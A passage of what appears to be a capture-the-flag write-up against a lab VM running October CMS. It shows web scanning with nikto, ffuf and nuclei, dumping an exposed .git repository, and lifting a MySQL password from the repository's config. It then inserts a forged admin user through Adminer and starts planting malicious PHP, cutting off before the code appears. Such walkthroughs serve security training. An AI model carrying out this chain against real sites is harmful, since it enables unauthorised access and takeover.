+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h3>
+<p>Scanning and enumerating all websites.</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>/home/tiago<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nikto -h 192.168.0.63
+</span></span><span class="line"><span class="cl">- Nikto v2.1.6
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">+ Target IP:          192.168.0.63
+</span></span><span class="line"><span class="cl">+ Target Hostname:    192.168.0.63
+</span></span><span class="line"><span class="cl">+ Target Port:        <span class="m">80</span>
+</span></span><span class="line"><span class="cl">+ Start Time:         2020-12-10 11:37:30 <span class="o">(</span>GMT-3<span class="o">)</span>
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">+ Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">+ The anti-clickjacking X-Frame-Options header is not present.
+</span></span><span class="line"><span class="cl">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+</span></span><span class="line"><span class="cl">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
+</span></span><span class="line"><span class="cl">+ No CGI Directories found <span class="o">(</span>use <span class="s1">&#39;-C all&#39;</span> to force check all possible <span class="nb">dirs</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">+ Apache/2.4.29 appears to be outdated <span class="o">(</span>current is at least Apache/2.4.37<span class="o">)</span>. Apache 2.2.34 is the EOL <span class="k">for</span> the 2.x branch.
+</span></span><span class="line"><span class="cl">+ OSVDB-3093: /.htaccess: Contains configuration and/or authorization information
+</span></span><span class="line"><span class="cl">+ OSVDB-3233: /icons/README: Apache default file found.
+</span></span><span class="line"><span class="cl">+ OSVDB-3092: /.git/index: Git Index file may contain directory listing information.
+</span></span><span class="line"><span class="cl">+ /.git/HEAD: Git HEAD file found. Full repo details may be present.
+</span></span><span class="line"><span class="cl">+ /.git/config: Git config file found. Infos about repo details may be present.
+</span></span><span class="line"><span class="cl">+ X-XSS-Protection header has been <span class="nb">set</span> to disable XSS Protection. There is unlikely to be a good reason <span class="k">for</span> this.
+</span></span><span class="line"><span class="cl">+ /.gitignore: .gitignore file found. It is possible to grasp the directory structure.
+</span></span><span class="line"><span class="cl">+ <span class="m">7915</span> requests: <span class="m">0</span> error<span class="o">(</span>s<span class="o">)</span> and <span class="m">11</span> item<span class="o">(</span>s<span class="o">)</span> reported on remote host
+</span></span><span class="line"><span class="cl">+ End Time:           2020-12-10 11:40:03 <span class="o">(</span>GMT-3<span class="o">)</span> <span class="o">(</span><span class="m">153</span> seconds<span class="o">)</span>
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">+ <span class="m">1</span> host<span class="o">(</span>s<span class="o">)</span> tested</span></span></code></pre></div></div><div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>tiago㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nikto -h 192.168.0.63:8585                                          
+</span></span><span class="line"><span class="cl">- Nikto v2.1.6
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">+ Target IP:          192.168.0.63
+</span></span><span class="line"><span class="cl">+ Target Hostname:    192.168.0.63
+</span></span><span class="line"><span class="cl">+ Target Port:        <span class="m">8585</span>
+</span></span><span class="line"><span class="cl">+ Start Time:         2020-12-10 11:37:50 <span class="o">(</span>GMT-3<span class="o">)</span>
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">+ Server: No banner retrieved
+</span></span><span class="line"><span class="cl">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+</span></span><span class="line"><span class="cl">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
+</span></span><span class="line"><span class="cl">+ Cookie lang created without the httponly flag
+</span></span><span class="line"><span class="cl">+ No CGI Directories found <span class="o">(</span>use <span class="s1">&#39;-C all&#39;</span> to force check all possible <span class="nb">dirs</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">+ Uncommon header <span class="s1">&#39;content-disposition&#39;</span> found, with contents: attachment<span class="p">;</span> <span class="nv">filename</span><span class="o">=</span>favicon.png
+</span></span><span class="line"><span class="cl">+ Uncommon header <span class="s1">&#39;content-transfer-encoding&#39;</span> found, with contents: binary
+</span></span><span class="line"><span class="cl">+ Uncommon header <span class="s1">&#39;content-description&#39;</span> found, with contents: File Transfer
+</span></span><span class="line"><span class="cl">+ Cookie redirect_to created without the httponly flag
+</span></span><span class="line"><span class="cl">+ /debug/: Possible debug directory/program found.
+</span></span><span class="line"><span class="cl">+ <span class="m">7919</span> requests: <span class="m">0</span> error<span class="o">(</span>s<span class="o">)</span> and <span class="m">8</span> item<span class="o">(</span>s<span class="o">)</span> reported on remote host
+</span></span><span class="line"><span class="cl">+ End Time:           2020-12-10 11:38:19 <span class="o">(</span>GMT-3<span class="o">)</span> <span class="o">(</span><span class="m">29</span> seconds<span class="o">)</span>
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">+ <span class="m">1</span> host<span class="o">(</span>s<span class="o">)</span> tested</span></span></code></pre></div></div>
+<h3 id="ffuf" class="heading">ffuf <a href="#ffuf" aria-labelledby="ffuf">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h3>
+<p>Doing some enumeration with <code>ffuf</code></p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>/home/tiago/apps/tools/ffuf_1.1.0_linux_amd64<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ./ffuf -w /usr/share/wordlists/dirb/big.txt -u http://192.168.0.63/FUZZ
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
+</span></span><span class="line"><span class="cl">       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
+</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
+</span></span><span class="line"><span class="cl">        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
+</span></span><span class="line"><span class="cl">          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       v1.1.0
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> :: Method           : GET
+</span></span><span class="line"><span class="cl"> :: URL              : http://192.168.0.63/FUZZ
+</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
+</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
+</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
+</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200,204,301,302,307,401,403
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">.htaccess               <span class="o">[</span>Status: 200, Size: 1678, Words: 282, Lines: 53<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="m">0</span>                       <span class="o">[</span>Status: 200, Size: 12664, Words: 929, Lines: 331<span class="o">]</span>
+</span></span><span class="line"><span class="cl">About                   <span class="o">[</span>Status: 200, Size: 18656, Words: 977, Lines: 478<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Services                <span class="o">[</span>Status: 200, Size: 10026, Words: 815, Lines: 267<span class="o">]</span>
+</span></span><span class="line"><span class="cl">about                   <span class="o">[</span>Status: 200, Size: 18656, Words: 977, Lines: 478<span class="o">]</span>
+</span></span><span class="line"><span class="cl">backend                 <span class="o">[</span>Status: 302, Size: 406, Words: 60, Lines: 12<span class="o">]</span>
+</span></span><span class="line"><span class="cl">config                  <span class="o">[</span>Status: 301, Size: 313, Words: 20, Lines: 10<span class="o">]</span>
+</span></span><span class="line"><span class="cl">modules                 <span class="o">[</span>Status: 301, Size: 314, Words: 20, Lines: 10<span class="o">]</span>
+</span></span><span class="line"><span class="cl">plugins                 <span class="o">[</span>Status: 301, Size: 314, Words: 20, Lines: 10<span class="o">]</span>
+</span></span><span class="line"><span class="cl">services                <span class="o">[</span>Status: 200, Size: 10026, Words: 815, Lines: 267<span class="o">]</span>
+</span></span><span class="line"><span class="cl">storage                 <span class="o">[</span>Status: 301, Size: 314, Words: 20, Lines: 10<span class="o">]</span>
+</span></span><span class="line"><span class="cl">themes                  <span class="o">[</span>Status: 301, Size: 313, Words: 20, Lines: 10<span class="o">]</span>
+</span></span><span class="line"><span class="cl">vendor                  <span class="o">[</span>Status: 301, Size: 313, Words: 20, Lines: 10<span class="o">]</span>
+</span></span><span class="line"><span class="cl">:: Progress: <span class="o">[</span>20469/20469<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">97</span> req/sec :: Duration: <span class="o">[</span>0:03:30<span class="o">]</span> :: Errors: <span class="m">0</span> ::</span></span></code></pre></div></div><div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>tiago㉿kali<span class="o">)</span>-<span class="o">[</span>~/apps/tools/ffuf_1.1.0_linux_amd64<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ./ffuf -w /usr/share/wordlists/dirb/big.txt -u http://192.168.0.63:8585/FUZZ                                                                        <span class="m">127</span> ⨯
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
+</span></span><span class="line"><span class="cl">       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
+</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
+</span></span><span class="line"><span class="cl">        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
+</span></span><span class="line"><span class="cl">          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       v1.1.0
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> :: Method           : GET
+</span></span><span class="line"><span class="cl"> :: URL              : http://192.168.0.63:8585/FUZZ
+</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
+</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
+</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
+</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200,204,301,302,307,401,403
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">admin                   <span class="o">[</span>Status: 302, Size: 34, Words: 2, Lines: 3<span class="o">]</span>
+</span></span><span class="line"><span class="cl">avatars                 <span class="o">[</span>Status: 302, Size: 31, Words: 2, Lines: 3<span class="o">]</span>
+</span></span><span class="line"><span class="cl">css                     <span class="o">[</span>Status: 302, Size: 27, Words: 2, Lines: 3<span class="o">]</span>
+</span></span><span class="line"><span class="cl">debug                   <span class="o">[</span>Status: 200, Size: 160, Words: 18, Lines: 5<span class="o">]</span>
+</span></span><span class="line"><span class="cl">explore                 <span class="o">[</span>Status: 302, Size: 37, Words: 2, Lines: 3<span class="o">]</span>
+</span></span><span class="line"><span class="cl">fonts                   <span class="o">[</span>Status: 302, Size: 29, Words: 2, Lines: 3<span class="o">]</span>
+</span></span><span class="line"><span class="cl">frank                   <span class="o">[</span>Status: 200, Size: 11236, Words: 968, Lines: 345<span class="o">]</span>
+</span></span><span class="line"><span class="cl">healthcheck             <span class="o">[</span>Status: 200, Size: 26, Words: 4, Lines: 2<span class="o">]</span>
+</span></span><span class="line"><span class="cl">img                     <span class="o">[</span>Status: 302, Size: 27, Words: 2, Lines: 3<span class="o">]</span>
+</span></span><span class="line"><span class="cl">issues                  <span class="o">[</span>Status: 302, Size: 34, Words: 2, Lines: 3<span class="o">]</span>
+</span></span><span class="line"><span class="cl">js                      <span class="o">[</span>Status: 302, Size: 26, Words: 2, Lines: 3<span class="o">]</span>
+</span></span><span class="line"><span class="cl">milestones              <span class="o">[</span>Status: 302, Size: 34, Words: 2, Lines: 3<span class="o">]</span>
+</span></span><span class="line"><span class="cl">notifications           <span class="o">[</span>Status: 302, Size: 34, Words: 2, Lines: 3<span class="o">]</span>
+</span></span><span class="line"><span class="cl">vendor                  <span class="o">[</span>Status: 302, Size: 30, Words: 2, Lines: 3<span class="o">]</span>
+</span></span><span class="line"><span class="cl">:: Progress: <span class="o">[</span>20469/20469<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">346</span> req/sec :: Duration: <span class="o">[</span>0:00:59<span class="o">]</span> :: Errors: <span class="m">0</span> ::</span></span></code></pre></div></div>
+<h3 id="nuclei" class="heading">Nuclei <a href="#nuclei" aria-labelledby="nuclei">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h3>
+<p>Back to <code>nikto</code> look at those <strong>git</strong> files available to us. The same can be achieved with <code>nuclei</code>.</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./nuclei -l urls.txt -t nuclei-templates/files/ -o results.txt</span></span></code></pre></div></div><p><img alt="image-20201210205544106" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055823/blog/image-20201210205544106_tbrzda.png"></p>
+
+<h3 id="git-dumper" class="heading">Git-dumper <a href="#git-dumper" aria-labelledby="git-dumper">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h3>
+<p>Now we can dump it easily with <code>git-dumper</code> on folder <strong>devguru</strong>.</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./git-dumper.py http://192.168.0.63/.git devguru</span></span></code></pre></div></div><p>Inside <strong>devguru</strong> folder, you&rsquo;ll finde only <code>.git</code> file. Let&rsquo;s analyse it and checkout to last commit.</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git log --pretty<span class="o">=</span>oneline</span></span></code></pre></div></div><p><img alt="image-20201210210115139" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055823/blog/image-20201210210115139_amlkyd.png"></p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git log --pretty<span class="o">=</span>format:<span class="s2">&#34;%h %s&#34;</span> --graph</span></span></code></pre></div></div><p><img alt="image-20201210210158553" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055823/blog/image-20201210210158553_fjaisy.png"></p>
+<p>Now checkout to commit and list it&rsquo;s content.</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git checkout 7de9115
+</span></span><span class="line"><span class="cl">ls</span></span></code></pre></div></div><p><img alt="image-20201210210304335" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055823/blog/image-20201210210304335_mcqsqb.png"></p>
+<p>Looking for password in <code>config</code> folder.</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">fgrep -r password config/</span></span></code></pre></div></div><p><img alt="image-20201210211308719" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055824/blog/image-20201210211308719_z9xvmi.png"></p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="s1">&#39;mysql&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;driver&#39;</span>     <span class="o">=&gt;</span> <span class="s1">&#39;mysql&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;engine&#39;</span>     <span class="o">=&gt;</span> <span class="s1">&#39;InnoDB&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;host&#39;</span>       <span class="o">=&gt;</span> <span class="s1">&#39;localhost&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;port&#39;</span>       <span class="o">=&gt;</span> <span class="mi">3306</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;database&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;octoberdb&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;username&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;october&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;password&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;SQ66EBYx4GT3byXH&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;charset&#39;</span>    <span class="o">=&gt;</span> <span class="s1">&#39;utf8mb4&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;collation&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;utf8mb4_unicode_ci&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;prefix&#39;</span>     <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;varcharmax&#39;</span> <span class="o">=&gt;</span> <span class="mi">191</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">],</span></span></span></code></pre></div></div><p>Look at the path <code>adminer.php</code>, sounds interesting.</p>
+<p>The database Adminer has its version as 4.7.7, giving me suggestion to update to 4.7.8. Maybe some vulnerability ahead.</p>
+<p><img alt="image-20201210211707046" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055825/blog/image-20201210211707046_ipwlro.png"></p>
+<p><img alt="image-20201210211729792" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055824/blog/image-20201210211729792_aoymlv.png"></p>
+<p>Verifying MySQL version</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">SHOW</span><span class="w"> </span><span class="n">VARIABLES</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s2">&#34;%version%&#34;</span></span></span></code></pre></div></div><p><img alt="image-20201211093344381" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055825/blog/image-20201211093344381_i1xzsl.png"></p>
+<p>Looking at user table.</p>
+<p><img alt="image-20201210212838550" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055825/blog/image-20201210212838550_in0uvs.png"></p>
+<p><a href="https://bcrypt-generator.com/">Create a bcrypt password</a>. Take care with the amount of rounds, I used 10 rounds.</p>
+<p><img alt="image-20201211094754135" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055825/blog/image-20201211094754135_srnjgp.png"></p>
+<p>Password <code>GetShell</code></p>
+<p><img alt="image-20201211095607153" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055825/blog/image-20201211095607153_hxumxy.png"></p>
+<p>Clone Frank user line and create yours with your own user.</p>
+<p><img alt="image-20201211095735280" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055825/blog/image-20201211095735280_nsskcf.png"></p>
+<p>Now you can login with your user.</p>
+<p><img alt="image-20201211095816647" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055826/blog/image-20201211095816647_vgr0wb.png"></p>
+<p>October CMS Version 1.0.1</p>
+<p><img alt="image-20201211135631359" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055826/blog/image-20201211135631359_eyp8nd.png"></p>
+
+<h1 id="-foothold" class="heading">🚪🚶 Foothold <a href="#-foothold" aria-labelledby="-foothold">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h1>
+<p>Once logged into October, we can add a malicious php code to be executed when the page loaded. Let&rsquo;s do it in Home page. First create a malicious markup which will call out php code.</p>
+<p><img alt="image-20201214111732338" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055827/blog/image-20201214111732338_gt85yo.png"></p>
+<p>Now insert the malicious code.</p>
